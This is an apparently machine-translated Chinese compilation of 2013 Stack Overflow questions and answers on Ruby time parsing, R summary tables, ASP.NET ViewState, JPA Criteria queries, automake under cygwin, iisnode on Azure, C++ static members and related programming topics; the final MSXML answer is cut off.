所以确实，就像 Saurabh 指出的那样，这是您的客户如何将时间序列化为字符串的问题。我的建议是将您解析的字符串更改为使用标准格式，如[RFC2822](https://www.rfc-editor.org/rfc/rfc2822#section-3.3)（类似于您的格式）或[ISO8601](http://en.wikipedia.org/wiki/ISO_8601)。在这种情况下，您的时间应该被正确解析。

```
irb(main):049:0> Time.zone.parse('Wed Feb 27 2013 19:46:21 GMT+0800 (PHT)')
=> Thu, 28 Feb 2013 00:46:21 UTC +00:00
irb(main):050:0> Time.zone.parse('Wed Feb 27 2013 19:46:21 +0800 (PHT)')
=> Wed, 27 Feb 2013 11:46:21 UTC +00:00 
```

在我刚刚进行的快速测试中，Javascript 似乎无法轻松输出 RFC 2822 字符串（没有“GMT”）。但是，暂时不要离开`gsub`，不能保证永远存在“GMT”或“UTC”。幸运的是，ISO 似乎很容易做到。（如果格式符合您的喜好，那就是 ;o) ）

```
> new Date();
Wed, 27 Feb 2013 13:22:20 GMT # bad
> (new Date()).toString();
'Wed Feb 27 2013 08:22:25 GMT-0500 (EST)' # bad
> (new Date()).toUTCString();
'Wed, 27 Feb 2013 13:22:31 GMT' # still bad :(
> (new Date()).toISOString();
'2013-02-27T13:22:57.310Z' # good 
```

## 不能碰这个！（Javascript 客户端）

或者，如果更改客户端是不可能的，或者您正在寻找一个快速而肮脏的修复，您可以使用`Date::_parse`它，它似乎可以正确计算出您的偏移量。

```
irb(main):052:0> d = Date._parse('Wed Feb 27 2013 19:46:21 +0800 (PHT)')
=> {:wday=>3, :zone=>"+0800", :hour=>19, :min=>46, :sec=>21, :year=>2013, :mon=>2, :mday=>27, :offset=>28800}
irb(main):053:0> Time.new(d[:year], d[:mon], d[:mday], d[:hour], d[:min], d[:sec], d[:offset])
=> 2013-02-27 19:46:21 +0800 
```

但是，我不确定这种方法是否可以长期使用，因为它使用内部日期解析函数。此外，使用标准时间字符串可能是个好主意。

所以记住孩子们，标准是你的朋友！使用它们！

# svn - SVN 不会更新文件

> ID：15111623
> 
> 赞同：2
> 
> 时间：2013-02-27T12:02:11.650
> 
> 标签：svn, tortoisesvn

我已经使用了很多 SVN，但今天它给了我一个问题。我有一个不会更新的文件。如果我做一个“与以前版本的差异”，它会告诉我应该进行更改。如果我对文件进行 SVN 更新，它说它已经完成，但文件没有改变。我做了一个'干净'。我已经删除了整个存储库，当“更新”完成时，仍然没有获取最新版本。几乎就好像它在进行更新时没有获取最新版本。

现在很迷茫。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:57:23.817

该`Update`菜单项旨在将存储库更改带入您的工作副本。由于没有获取任何更改，我会说您的文件是最新的。

`Diff with previous version`菜单项显示提交给此类文件的最后更改。它总会显示一些东西。

# r - 创建不同长度的分类变量的汇总表

> ID：15111629
> 
> 赞同：8
> 
> 时间：2013-02-27T12:02:36.670
> 
> 标签：r, count, spss, summary

在 SPSS 中，使用“自定义表”创建分类变量的汇总表相当容易：

![这个例子来自 SPSS](../Images/27996da5aff86541877e21a39dfc48f4.png)

**我怎样才能在 R 中做到这一点？**

首选通用和可扩展的解决方案，以及使用 Plyr 和/或 Reshape2 包的解决方案，因为我正在努力学习这些。

示例数据：（mtcars 在 R 安装中）

```
df <- colwise(function(x) as.factor(x) ) (mtcars[,8:11]) 
```

附言

请注意，我的目标是把所有东西都放在*一张*桌子上，如图所示。我已经苦苦挣扎了好几个小时，但我的尝试非常糟糕，以至于发布代码可能不会增加问题的可理解性。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T12:18:16.223

获取输出的一种方法，但不是格式：

```
library(plyr)
ldply(mtcars[,8:11],function(x) t(rbind(names(table(x)),table(x),paste0(prop.table(table(x))*100,"%"))))
    .id 1  2       3
1    vs 0 18  56.25%
2    vs 1 14  43.75%
3    am 0 19 59.375%
4    am 1 13 40.625%
5  gear 3 15 46.875%
6  gear 4 12   37.5%
7  gear 5  5 15.625%
8  carb 1  7 21.875%
9  carb 2 10  31.25%
10 carb 3  3  9.375%
11 carb 4 10  31.25%
12 carb 6  1  3.125%
13 carb 8  1  3.125% 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-27T12:24:41.900

使用`lapply()`和`do.call()`with`rbind()`将各个部分拼接在一起的基本 R 解决方案：

```
x <- lapply(mtcars[, c("vs", "am", "gear", "carb")], table)

neat.table <- function(x, name){
  xx <- data.frame(x)
  names(xx) <- c("Value", "Count")
  xx$Fraction <- with(xx, Count/sum(Count))
  data.frame(Variable = name, xx)
}

do.call(rbind, lapply(seq_along(x), function(i)neat.table(x[i], names(x[i])))) 
```

结果是：

```
 Variable Value Count Fraction
1        vs     0    18  0.56250
2        vs     1    14  0.43750
3        am     0    19  0.59375
4        am     1    13  0.40625
5      gear     3    15  0.46875
6      gear     4    12  0.37500
7      gear     5     5  0.15625
8      carb     1     7  0.21875
9      carb     2    10  0.31250
10     carb     3     3  0.09375
11     carb     4    10  0.31250
12     carb     6     1  0.03125
13     carb     8     1  0.03125 
```

剩下的就是格式化了。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-27T13:04:53.177

这是我的解决方案。它不漂亮，这就是为什么我在它的头上放了一个包（将它包裹在一个函数中）。我还添加了另一个变量来证明它是通用的（我希望如此）。

```
prettyTable <- function(x) {

  tbl <- apply(x, 2, function(m) {
    marc <- sort(unique(m))
    cnt <- matrix(table(m), ncol = 1)
    out <- cbind(marc, cnt)
    out <- out[order(marc), ] # do sorting
    out <- cbind(out, round(prop.table(out, 2)[, 2] * 100, 2))
  })

  x2 <- do.call("rbind", tbl)

  spaces <- unlist(lapply(apply(x, 2, unique), length))
  space.names <- names(spaces)
  spc <- rep("", sum(spaces))
  ind <- cumsum(spaces)
  ind <- abs(spaces - ind)+1
  spc[ind] <- space.names

  out <- cbind(spc, x2)
  out <- as.data.frame(out)

  names(out) <- c("Variable", "Levels", "Count", "Column N %")
  out
}

prettyTable(x = mtcars[, c(2, 8:11)])

   Variable Levels Count Column N %
1       cyl      4    11      34.38
2                6     7      21.88
3                8    14      43.75
4        vs      0    18      56.25
5                1    14      43.75
6        am      0    19      59.38
7                1    13      40.62
8      gear      3    15      46.88
9                4    12       37.5
10               5     5      15.62
11     carb      1     7      21.88
12               2    10      31.25
13               3     3       9.38
14               4    10      31.25
15               6     1       3.12
16               8     1       3.12 
```

使用`googleVis`包，您可以制作一个方便的 html 表格。

```
plot(gvisTable(prettyTable(x = mtcars[, c(2, 8:11)]))) 
```

![在此处输入图像描述](../Images/5b73c9411718b7f343ada7d5af8e31c6.png)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T13:50:44.643

您可能会发现以下代码片段很有用。它利用基本包函数*table*、*margin.table*和*prop.table*，不需要任何其他包。但是，它确实将结果收集到具有命名维度的列表中（这些可以使用*rbind*收集到单个矩阵中）：

```
dat <- table(mtcars[,8:11])
result <- list()
for(m in 1:length(dim(dat))){
    martab <- margin.table(dat, margin=m)
    result[[m]] <- cbind(Freq=martab, Prop=prop.table(martab))
}
names(result) <- names(dimnames(dat))

> result
$vs
  Freq   Prop
0   18 0.5625
1   14 0.4375

$am
  Freq    Prop
0   19 0.59375
1   13 0.40625

$gear
  Freq    Prop
3   15 0.46875
4   12 0.37500
5    5 0.15625

$carb
  Freq    Prop
1    7 0.21875
2   10 0.31250
3    3 0.09375
4   10 0.31250
6    1 0.03125
8    1 0.03125 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-27T12:33:02.480

这是使用包`freq`功能的解决方案`questionr`（无耻的自动促销，对不起）：

```
R> lapply(df, freq)
$vs
    n    %
0  18 56.2
1  14 43.8
NA  0  0.0

$am
    n    %
0  19 59.4
1  13 40.6
NA  0  0.0

$gear
    n    %
3  15 46.9
4  12 37.5
5   5 15.6
NA  0  0.0

$carb
    n    %
1   7 21.9
2  10 31.2
3   3  9.4
4  10 31.2
6   1  3.1
8   1  3.1
NA  0  0.0 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-02-02T07:26:43.893

不幸的是，似乎还没有 R 包可以生成像 SPSS 这样的好输出。大多数用于生成表格的函数似乎都定义了自己的特殊格式，如果您想以其他方式导出或处理表格，这会给您带来麻烦。
但我确信 R 能够做到这一点，所以我开始编写自己的函数。我很高兴与您分享结果（工作正在进行中，但已完成工作）：

以下函数为 data.frame 中的所有因子变量返回因子变量“变量”的每个级别的频率或百分比 (calc="perc")。
最重要的可能是输出是一个简单且用户友好的 data.frame。因此，与许多其他功能相比，以任何您想要的方式导出结果并使用它都没有问题。

我意识到进一步改进的潜力很大，即增加了选择行与列百分比计算的可能性等。

```
contitable <- function( survey_data, variable, calc="freq" ){    

  # Check which variables are not given as factor    
  # and exlude them from the given data.frame    
 survey_data_factor_test <- as.logical( sapply( Survey, FUN=is.factor) )    
  survey_data <- subset( survey_data, select=which( survey_data_factor_test ) )    

  # Inform the user about deleted variables    
  # is that proper use of printing to console during a function call??    
  # for now it worksjust fine...    
  flush.console()        
  writeLines( paste( "\n ", sum( !survey_data_factor_test, na.rm=TRUE),
            "non-factor variable(s) were excluded\n" ) )

  variable_levels <- levels(survey_data[ , variable ])    
  variable_levels_length <- length( variable_levels )    

  # Initializing the data.frame which will gather the results    
  result <- data.frame( "Variable", "Levels", t(rep( 1, each=variable_levels_length ) ) )    
  result_column_names <- paste( variable, variable_levels, sep="." )    
  names(result) <- c("Variable", "Levels", result_column_names )    

  for(column in 1:length( names(survey_data) ) ){       

      column_levels_length <- length( levels( survey_data[ , column ] ) )
      result_block <- as.data.frame( rep( names(survey_data)[column], each=column_levels_length ) )
      result_block <- cbind( result_block, as.data.frame( levels( survey_data[,column] ) ) )
      names(result_block) <- c( "Variable", "Levels" )

      results <- table( survey_data[ , column ], survey_data[ , variable ] )

      if( calc=="perc" ){ 
        results <- apply( results, MARGIN=2, FUN=function(x){ x/sum(x) }) 
        results <- round( results*100, 1 )
      }

      results <- unclass(results)
      results <- as.data.frame( results )
      names( results ) <- result_column_names
      rownames(results) <- NULL

      result_block <- cbind( result_block, results) 
      result <- rbind( result, result_block ) 
}    
result <- result[-1,]        
return( result )    
} 
```

# asp.net - ViewState 在 app_code 中的类中不起作用

> ID：15111630
> 
> 赞同：0
> 
> 时间：2013-02-27T12:02:37.217
> 
> 标签：asp.net, vb.net

请帮助解决这个问题。Viewstate 是否允许在 app_code 的类中使用？

我在 app_code 中有这段代码，但它似乎不起作用。视图状态始终设置为空。如何在 App_Code 文件夹中的类中保留 ViewState 中的值？

```
 Public Property GridViewSortDirection() As String

            Get
                Return IIf(ViewState("SortDirection") = Nothing, "ASC", ViewState("SortDirection"))
            End Get
            Set(ByVal value As String)
                ViewState("SortDirection") = value
            End Set
 End Property 
```

这是设置 GridviewSortDirectio 值的代码

```
Public Function GetSortDirection() As String

            Select Case GridViewSortDirection
                Case "ASC"
                    GridViewSortDirection = "DESC"
                Case "DESC"
                    GridViewSortDirection = "ASC"
            End Select

            Return GridViewSortDirection
        End Function 
```

然后在页面（test.aspx.vb）中调用getSortDirection

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:49:12.373

如果您在浏览器中查看源代码，您会看到很多乱码，只需搜索 VIEWSTATE 即可看到。这很重要，因为 HTTP 请求是无状态的，这意味着浏览器对服务器的每个请求都会离开旧页面并获取新页面。

在回发期间，这是一个问题，因为您实际上是在离开页面并获得一个干净的新页面，它恰好是同一个页面。需要有一种方法来保存页面的**状态**，例如下拉选择或文本框输入，这是通过 ViewState 完成的。您看到的乱码是这些信息作为用于维护状态的编码数据。

当您刷新浏览器窗口（顶部的按钮）时，ViewState 会丢失，数据会恢复到原始状态。

App_Code 是存储在**服务器上的类，与****页面**无关。这就是 App_Code 中没有 ViewState 的原因。如果您想在页面之外维护状态，则将`Session`数据存储在服务器上，直到您关闭浏览器窗口。在您的情况下，将数据作为参数传递可能更合适

```
Public Function GetSortDirection(direction) As String
            Select Case direction
                Case "ASC"
                    Return "DESC"
                Case "DESC"
                    Return "ASC"
            End Select
        End Function 
```

如需深入解释，请阅读 MSDN[文章](http://msdn.microsoft.com/en-us/library/ms972976.aspx)

# javascript - 站点的 API 未定义

> ID：15111637
> 
> 赞同：1
> 
> 时间：2013-02-27T12:02:56.643
> 
> 标签：javascript, api, google-chrome-extension

我正在尝试从 Chrome 扩展程序[访问 plug.dj API](http://blog.plug.dj/api-documentation/)`API.bar()` ，但每次我输入它都会给我：

> 未捕获的 ReferenceError：未定义 API

我使用以下 manifest.json

```
{
   "content_scripts": [ {
      "js": [
         "jquery.js",
         "lastfm.api.md5.js", 
         "lastfm.api.js",
         "script.js"
      ],
      "css": [ "LastFMLink.css" ],
      "matches": [ 
         "http://plug.dj/*", 
         "http://plug.dj/*/*"
         ],
      "run_at": "document_end"
   } 
   ],

   "name": "Plug.Dj VS last.Fm",
   "description": "Implement information about the artist",
   "icons": { "16": "cookie.png", "48": "cookie.png", "128": "cookie.png" },
   "permissions": [ 
      "http://plug.dj/*", 
      "http://plug.dj/*/*"
   ],
   "version": "1.0.0",
   "web_accessible_resources": ["script.js"],
   "manifest_version": 2
} 
```

任何人都知道我可能做错了什么？还是忘记？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-22T17:22:12.630

等待站点加载完成。看：

```
function init() {
    //Write your code here
}
function cinit() {
    if (typeof API == "object" && API.getVolume() != undefined) {
        clearInterval(loadClock);
        init();
        return 1;
    } else {
        return 0;
    }
}
var loadClock = setInterval(cinit, 500); 
```

# jquery - jquery 没有正确选择下拉列表的选定值

> ID：15111640
> 
> 赞同：0
> 
> 时间：2013-02-27T12:03:09.520
> 
> 标签：jquery, html

问题是 Jquery 没有正确选择下拉列表的选定值。它正在选择在页面加载时选择的值。一个小代码示例如下：

```
 $.trim($("#abc option:selected").text()) 
```

但它似乎总是选择加载页面时较早选择的值。. 还有其他下拉菜单似乎也有类似的情况。

亲切的问候，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:25:57.333

获取值的代码是在函数之外编写的，这可能是它在页面加载时执行的原因。:)

# java - JPA 2 Criteria API，儿童计数标准

> ID：15111644
> 
> 赞同：3
> 
> 时间：2013-02-27T12:03:17.777
> 
> 标签：java, jpa, criteria

我正在尝试实现类似的东西：

```
SELECT c.*, asCount.assetCount
FROM Company c
LEFT JOIN (
    SELECT company_id, COUNT(*) as assetCount 
    FROM Asset 
    GROUP BY company_id) asCount
ON c.id = asCount.company_id 
```

**问题：**如何使用 JPA 2 Criteria 实现这一点？

我能够单独获得 asCount 结果，但不知道如何将其加入公司

```
CriteriaBuilder builder = em.getCriteriaBuilder();
CriteriaQuery<Tuple> cq = builder.createTupleQuery();
Root<Asset> asset = cq.from(Asset.class);
cq.multiselect(asset.<Company>get("company").<Long>get("id").alias("id"), builder.count(asset).alias("assetCount"));
cq.groupBy( asset.<Company>get("company").<Long>get("id") );

Query query = em.createQuery(cq);
List<Tuple> results = query.getResultList(); 
```

提前致谢。

PS
1\. 有一个类似的线程使用 Hibernate API 询问子项计数： [Hibernate children count criteria](https://stackoverflow.com/questions/4255382/hibernate-children-count-criteria)
2\. 描述该主题的另一个有用线程：[JPA CriteriaBuilder - 按一对多关系中关联实体的数量排序](https://stackoverflow.com/questions/14425674/jpa-criteriabuilder-sort-by-the-number-of-associated-entities-in-a-one-to-many)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T12:30:19.840

好的，我自己找到了解决方案。希望它可以帮助别人:)

```
CriteriaQuery<Tuple> cq = builder.createTupleQuery();
Root<Company> company = cq.from(Company.class);
Join<Company, Asset> secondTable = company.join("assets", JoinType.LEFT);
cq.multiselect(company.<String>get("id").alias("id"), builder.count(secondTable).alias("assetCount"));
cq.groupBy( company.<Long>get("id") );

Query query = em.createQuery(cq);
List<Tuple> results = query.getResultList(); 
```

# javascript - Ajax 提供程序返回过多的 html Asp.Net

> ID：15111646
> 
> 赞同：0
> 
> 时间：2013-02-27T12:03:24.637
> 
> 标签：javascript, jquery, asp.net, ajax, asp.net-controls

我正在尝试对 Asp.net 中的页面进行部分更新。我通过 ajax 调用我的 .aspx 页面来构建我需要附加到页面上特定位置的内容，以前这对我有用。

我目前的问题是我得到了完整的 html 而不仅仅是元素，而且我不知道我以前做对了什么。

```
 var dataObj = { 'includeInactive': includeInactive, 'MasterPersonId': masterId, 'sChosenSSN': chosenSSN };

        $.ajax({
            url: 'clientside/providers/MergeJournalProviders/---ShowSomeDuplicateCivilRegistrationNumbers.aspx',
            dataType: 'html',
            data: dataObj,
            cache: false,
            async: true,
            beforeSend: function (xhr) {
            },
            success: function (result) {

                if (result != "" && result != undefined) {

                    //var htmlToAppend = $(result).find("#DuplicatePeople div").html();
                    //her vælger jeg gruppen(group) der skal opdateres
                    var oldDiv = $('#DupPpl');
                    var newDiv = jQuery(result).find('#DupPpl').html()
                    oldDiv.replaceWith(newDiv);
                    //$('#DupPpl').empty();
                    //$('#DupPpl').html(jQuery(result).find('#DuplicatePeople').html());
                    //$('#DupPpl').remove();
                    //$('#DupPpl').append(result);
                    //$('#DupPpl').append(result);

                }
            }
        }); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:15:39.713

这是使用更新面板的不幸后果。它们的简单性带来了更高的开销。发生的情况是，不仅面板的内容被回发，所有视图状态和 HTML 标题等也被回发。更有效的部分回发可以使用 jQuery、页面方法和 Web 服务来完成。查看这篇文章：http: [//msdn.microsoft.com/en-us/library/0b283bse%28v=vs.71%29.aspx](http://msdn.microsoft.com/en-us/library/0b283bse%28v=vs.71%29.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:56:38.497

如果您的结果包含您的 aspx 文件中的所有 html，并且该 html 中存在 id 为“DupPpl”的元素，您可以使用 jquery 内容获取该元素：

尝试：

```
var oldDiv = $('#DupPpl');
var newDiv = $(result).contents().find('#DupPpl').html();
oldDiv.replaceWith(newDiv); 
```

使用相同的代码获取其他元素：

```
$(result).contents().find('YOUR_ELEMENT_ID').html(); 
```

# android - 当我在 android 的 lib 文件夹中添加 google-play-services.jar 时，项目名称上出现感叹号

> ID：15111647
> 
> 赞同：1
> 
> 时间：2013-02-27T12:03:28.750
> 
> 标签：android

我尝试通过 google plus 登录，但是当我添加 jar 文件时“！”发生并且 jar 文件在代码中不起作用。我该怎么做才能解决它？？？？请帮我解决这个问题

# netbeans - 无法构建 microhttpd 项目。使用 cygwin 生成 Makefile 问题

> ID：15111648
> 
> 赞同：0
> 
> 时间：2013-02-27T12:03:30.427
> 
> 标签：netbeans, makefile, cygwin, apache, automake

我正在尝试使用 microhttpd 库来从 c++ 代码生成 html 站点。我在 Windows 上使用 netbeans 并用 cygwin 编译。我已经从[ftp://ftp.gnu.org/gnu/libmicrohttpd/](ftp://ftp.gnu.org/gnu/libmicrohttpd/)下载了 microhttpd 最新版本，并且已经能够运行这些示例。

我的问题是当我尝试构建自己创建的代码时（例如 hellobrowser，遵循本教程：[http](http://www.gnu.org/software/libmicrohttpd/tutorial.html#Hello-browser-example) ://www.gnu.org/software/libmicrohttpd/tutorial.html#Hello-browser-example ）。
我尝试重新使用makefile.am，删除示例代码的名称并添加hellobrowser（我认为这可以完成）。之后，我尝试在我的项目顶部运行 automake，以便它从 cygwin 终端或 netBeans 终端更新 makefile.in，但我收到以下错误：

```
/cygdrive/c/users/toni/NB/hellobrowser$ automake
    Can't locate Automake/Struct.pm in @INC (@INC contains: /mingw/share/automake-1.11 /usr/lib/perl5/5.10/i686-cygwin /usr/lib/perl5/5.10 /usr/lib/perl5/site_perl/5.10/i686-cygwin /usr/lib/perl5/site_perl/5.10 /usr/lib/perl5/vendor_perl/5.10/i686-cygwin /usr/lib/perl5/vendor_perl/5.10 /usr/lib/perl5/vendor_perl/5.10 /usr/lib/perl5/site_perl/5.8 /usr/lib/perl5/vendor_perl/5.8 .) at /cygdrive/c/Develop/MinGW/bin/automake-1.11 line 47.
    BEGIN failed--compilation aborted at /cygdrive/c/Develop/MinGW/bin/automake-1.11 line 47. 
```

但是在查看 automake 文件夹时，我可以找到 Struct.pm：

```
/cygdrive/c/develop/MinGW/share/automake-1.11/automake$ ls
    ChannelDefs.pm  Configure_ac.pm    Item.pm      Rule.pm     Variable.pm
    Channels.pm     DisjConditions.pm  ItemDef.pm   RuleDef.pm  Version.pm
    Condition.pm    FileUtils.pm       Location.pm  Struct.pm   Wrap.pm
    Config.pm       General.pm         Options.pm   VarDef.pm   XFile.pm 
```

如果 automake 工作，我会运行 configure（在示例中可以正常工作），并使用生成的 makefileS 构建项目。

如果有人能指出我做错了什么，我将不胜感激。非常感谢！

**注意**：我的项目有 3 个级别的 makefile，./、./src 和 ./src/examples，但我只考虑位于 ./src/examples 的文件，因为代码位于该路径内。

```
Makefile.am:

        SUBDIRS  = .

    if USE_PRIVATE_PLIBC_H
     PLIBC_INCLUDE = -I$(top_srcdir)/src/include/plibc
    endif

    AM_CPPFLAGS = \
      $(PLIBC_INCLUDE) \
      -I$(top_srcdir)/src/include \
      @LIBGCRYPT_CFLAGS@

    if USE_COVERAGE
      AM_CFLAGS = --coverage
    endif

    # example programs
    noinst_PROGRAMS = \
    hellobrowser 

    hellobrowser_SOURCES = \
     hellobrowser.c 
    hellobrowser_LDADD = \
     $(top_builddir)/src/daemon/libmicrohttpd.la 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T13:07:36.890

如错误消息所示，`@INC`不包含`/cygdrive/c/develop/MinGW/share/automake-1.11/automake`，这是您的`Struct.pm`谎言。

它确实包含`/mingw/share/automake-1.11`，这是一个完全不同的文件夹。可能有解决此问题的 automake 方法，但我对此并不熟悉。如果您所有的工具都是基于 cygwin 的（在这种情况下，您到底为什么要安装 MinGW？），那么您可以创建`/mingw/share/automake-1.11`一个指向正确文件夹的符号链接。

```
$ mkdir -p /mingw/share/
$ ln -s /cygdrive/c/develop/MinGW/share/automake-1.11/automake /mingw/share/automake-1.11 
```

...并确认（就确认 cygwin 程序而言）这有效：

```
$ ls /mingw/share/automake-1.11/ 
```

# sql-server-2008 - 将列传递给用户定义的函数 SQL

> ID：15111655
> 
> 赞同：2
> 
> 时间：2013-02-27T12:03:46.103
> 
> 标签：sql-server-2008, user-defined-functions

我有一个表，它有 40-50 列，都是 varchar，我想根据其中的数据对它们进行修剪和清理。（某些列可能包含数字和日期数据）。

我懒得为每一列写下单独的更新，所以我创建了一个用户定义的函数。

我向它传递了一个列名和一个标识符（DataType）——它返回给我“丰富的”值。

所以在一次更新中，我写

```
UPDATE TABLE
SET
column1 = function(column1, datatype)
column2 = function(column2, datatype)
WHERE <my filter condition>. 
```

但是，这很慢。我想知道是否有更好的方法来做到这一点。

这是功能：

```
 create function [dbo].[fn_Polaris_EnrichColumnToTargetDatatype] 
    (@ColumnName varchar(max), @Datatype varchar(max))
    returns varchar(max)
Begin
    Declare @EnrichedValue varchar(max);
    select @EnrichedValue = LTRIM(RTRIM(@ColumnName));

    if(@Datatype in ('Numeric', 'Decimal')) 
        BEGIN
            select @EnrichedValue = Replace(@EnrichedValue,',','');
            select @EnrichedValue = REPLACE(@EnrichedValue,'*','');
            select @EnrichedValue = REPLACE(@EnrichedValue,'$','');

            if (@EnrichedValue = '-' or len(@EnrichedValue) = 0 or @EnrichedValue is null or @EnrichedValue like '%[eE]%')
                begin
                    select @EnrichedValue = '0'
                end
            return @EnrichedValue
        END
    if(@Datatype in ('String', 'Varchar'))
        BEGIN
            select @EnrichedValue = REPLACE(@EnrichedValue, '"', '');
            return @EnrichedValue
        END
    return @EnrichedValue;
end 
```

# node.js - 是否可以扩展快递申请

> ID：15111665
> 
> 赞同：0
> 
> 时间：2013-02-27T12:04:05.750
> 
> 标签：node.js, express

让我试着解释一下我的目的。我的网站有 3 个子域。它们的工作原理相似，但有一些区别。

所以我的问题是我可以编写具有所有子域应用程序的功能的通用快速应用程序，并为每个子域应用程序扩展它并添加一些特定功能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T14:18:22.467

绝对地。主要问题是如何从应用程序代码中清晰地隔离特定领域的配置。

一种方法是使用一些中间件来检测请求在哪个域上入站，并将特定于该域的配置添加到请求中。这样，每个控制器只需要检查请求以查看应该如何处理它。然后它可以将部分或全部配置传递给数据和模板层。

# node.js - Azure 对我的 app.js 做了什么？

> ID：15111666
> 
> 赞同：1
> 
> 时间：2013-02-27T12:04:07.543
> 
> 标签：node.js, azure, iisnode

为什么 iisnode 试图将我的`app.js`文件作为 HTML 发送！？然而，它作为 javascript 正确发送的*所有其他 *.js 文件。*例子：

[应用程序.js](https://labellogic.azurewebsites.net/js/app.js)

[过滤器.js](https://labellogic.azurewebsites.net/js/filters.js)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T17:30:57.167

Windows Azure 网站中的 iisnode 不会尝试将您的 app.js 作为 HTML 发送回。它正在尝试将其作为 node.js 应用程序 ( [https://github.com/tjanczuk/iisnode](https://github.com/tjanczuk/iisnode) ) 运行。您可以在随 Windows Azure 网站应用程序一起部署的 web.config 文件中找到原因（您可以通过 FTP 连接到您的站点来检查该配置文件）。它包含以下条目：

```
<handlers>
  <add name="iisnode" path="app.js" verb="*" modules="iisnode"/>
</handlers> 
```

上面的 web.config 条目指示 IIS 将对 app.js 的所有请求重定向到 iisnode，因此将其视为 node.js 应用程序，而不是遵循将其作为静态文件提供的默认行为。

如果您在没有 web.config 的情况下将应用程序部署到 Windows Azure 网站，Windows Azure 网站将运行启发式方法来确定应用程序的类型并为其生成适当的 web.config 文件。显然，在您的情况下，它确定它是一个 node.js 应用程序，因此它在上面添加了 web.config 条目。

如果您想将 app.js 文件作为静态文件提供，您有两个选择。您可以将该文件重命名为其他名称。或者，您可以将 web.config 文件与不包含上述部分的应用程序一起部署。您可以使用 Windows Azure 网站当前为您创建的 web.config 作为起点。

# c++ - 构造函数和静态函数

> ID：15111667
> 
> 赞同：0
> 
> 时间：2013-02-27T12:04:08.367
> 
> 标签：c++, eclipse, optimization, arduino

我已经阅读了一些关于这个问题的帖子，但我不确定。当我有一个静态方法并且我调用它而不设置它所属的类的任何对象时，例如：

班上：

代码：

```
class Fruit {
    static int colour;
    Fruit();
    static int getColour();
    static void setColour();
    virtual ~Fruit();
} 
```

调用函数：

代码：

```
Fruit:getcolour(); 
```

静态函数的实现：

```
int Fruit::setColour() {
    return colour;
} 
```

构造函数是否被调用以运行静态函数？

因此，如果我让构造函数执行对象初始化之类的操作（将构造函数设置为调用 setColour() ），它会在函数之前运行`getColour`吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:06:06.403

不，构造函数不会被调用，也不需要被调用，因为`Fruit::color` **必须定义**它才能编译。

所以，这不是完整的代码。实现文件有类似的东西

```
int Fruit::colour = 42; 
```

`getcolour`除非您事先更改值，否则这将返回。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:06:25.113

假设`static`成员的定义（*没有它，您的程序将无法编译*）作为您忘记在 OP 中提及的细节，

> **构造函数是否被调用以运行静态函数？**

不，它没有。

`static`方法不对类的特定实例进行操作，因此不需要实例（*因此调用构造函数*）来调用`static`方法。
此外，除非明确将对象实例传递给方法，否则`static`方法只能对类成员进行操作。`static`鉴于`static`成员是每个类而不是每个实例，因此构造函数不会被调用是有道理的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:11:36.673

将静态成员函数或静态成员变量想象成类似于全局的东西。如果您需要一个静态函数来访问成员信息，您将需要创建一个全局实例或使用其中一种单例模式（如果您从多个线程中使用它，请注意惰性单例模式）。

# visual-c++ - MSXML DOM & 添加多条处理指令

> ID：15111671
> 
> 赞同：0
> 
> 时间：2013-02-27T12:04:15.733
> 
> 标签：visual-c++, msxml

MSXML DLL：msxml3.dll

我正在使用 MSXML DOM 编写 XML，并希望添加多个处理指令。前任：

**第一条处理指令。**

`xml version="1.0" encoding="ISO-8859-1"?`

**二次加工指令**

`xml-stylesheet type="text/xsl" href="cdcatalog.xsl"?`

我使用 MSXML DOM 编写了以下代码。但它未能添加第一和第二个处理指令。

**代码开始**

```
MSXML2::IXMLDOMElementPtr pXMLRootElem;
MSXML2::IXMLDOMNodePtr pTestDOMNodePtr;

//Create an instance of the DOMDocument object:
m_docPtr.CreateInstance(__uuidof(MSXML2::DOMDocument30));

char* xmlfile =  (char*)xmlFileFullPath.c_str();

_variant_t varXml(xmlfile); //XML file to load

m_docPtr->async = VARIANT_FALSE;

m_docPtr->validateOnParse = VARIANT_FALSE;

m_docPtr->resolveExternals = VARIANT_FALSE;

//load XML file.

if(m_docPtr->loadXML(_T("<catalog><cd></cd></catalog>")) == VARIANT_FALSE)

{

       CCommonFunction::log ("Failed to create the XML file.");

       return false;

}

//Get the root element just created    

pXMLRootElem = m_docPtr->GetdocumentElement();

//// Add first ProcessingInstruction <?xml version="1.0" encoding="ISO-8859-1"?>

MSXML2::IXMLDOMProcessingInstructionPtr pXMLProcessingNode =  

  m_docPtr->createProcessingInstruction("xml", " version='1.0' encoding='UTF-8'");

_variant_t vtObject;

vtObject.vt = VT_DISPATCH;

vtObject.pdispVal = pXMLRootElem;

vtObject.pdispVal->AddRef();

m_docPtr->insertBefore(pXMLProcessingNode,vtObject);

//// Add second ProcessingInstruction ?xml-stylesheet type="text/xsl" href="cdcatalog.xsl"?>

MSXML2::IXMLDOMProcessingInstructionPtr pXSLTNode =  

m_docPtr->createProcessingInstruction("xml-stylesheet", "type='text/xsl' href='cdcatalog.xsl'");

m_docPtr->insertBefore(pXSLTNode,vtObject); 
```

**请帮助理解为什么 MSXML 不添加多个处理指令？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T07:22:58.190

**我找到了解决方案：**

```
